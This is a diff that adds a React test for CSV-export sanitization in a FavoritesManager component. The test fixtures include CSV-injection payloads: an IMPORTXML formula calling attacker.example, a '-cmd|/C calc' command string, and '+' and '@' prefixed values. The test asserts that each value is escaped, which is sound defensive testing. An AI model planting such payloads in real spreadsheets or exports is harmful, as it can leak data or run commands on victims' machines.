@@ -1,4 +1,4 @@
-import { cleanup, render, screen, waitFor } from '@testing-library/react';
+import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
 import { MemoryRouter } from 'react-router-dom';
 import { afterEach, describe, expect, it, vi } from 'vitest';
 
@@ -182,5 +182,63 @@ describe('FavoritesManager', () => {
     expect(screen.queryByTitle('Mark as applied')).toBeNull();
     expect(screen.queryByTitle('Add note')).toBeNull();
     expect(screen.queryByText(/application status/i)).toBeNull();
+  });
+
+  it('neutralizes spreadsheet formulas in CSV exports', async () => {
+    let exportedBlob: Blob | null = null;
+    const createObjectURL = vi.spyOn(URL, 'createObjectURL').mockImplementation((blob) => {
+      exportedBlob = blob as Blob;
+      return 'blob:csv-export';
+    });
+    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
+    const clickSpy = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
+
+    mockedAxios.get.mockImplementation((url: string) => {
+      if (url === '/users/savedPrograms') {
+        return Promise.resolve({
+          data: {
+            savedPrograms: [
+              {
+                _id: 'fellowship-1',
+                id: 'fellowship-1',
+                title: '=IMPORTXML("https://attacker.example","//a")',
+                awardAmount: '+SUM(1,1)',
+                applicationLink: '-cmd|/C calc',
+                contactEmail: '@attacker.example',
+                isAcceptingApplications: true,
+              },
+            ],
+          },
+        });
+      }
+      return Promise.resolve({ data: {} });
+    });
+
+    render(
+      <MemoryRouter>
+        <FavoritesManager />
+      </MemoryRouter>,
+    );
+
+    await screen.findByText('=IMPORTXML("https://attacker.example","//a")');
+
+    fireEvent.click(screen.getByRole('button', { name: 'Export' }));
+    fireEvent.click(screen.getByRole('button', { name: 'Export as CSV' }));
+
+    await waitFor(() => expect(exportedBlob).not.toBeNull());
+    const csv = await exportedBlob!.text();
+
+    expect(csv).toContain('"\'=IMPORTXML(""https://attacker.example"",""//a"")"');
+    expect(csv).toContain(`"'+SUM(1,1)"`);
+    expect(csv).toContain('"\'-cmd|/C calc"');
+    expect(csv).toContain('"\'@attacker.example"');
+    expect(csv).not.toContain('"=IMPORTXML');
+    expect(csv).not.toContain('"+SUM');
+    expect(csv).not.toContain('"-cmd');
+    expect(csv).not.toContain('"@attacker');
+
+    createObjectURL.mockRestore();
+    revokeObjectURL.mockRestore();
+    clickSpy.mockRestore();
   });
 });
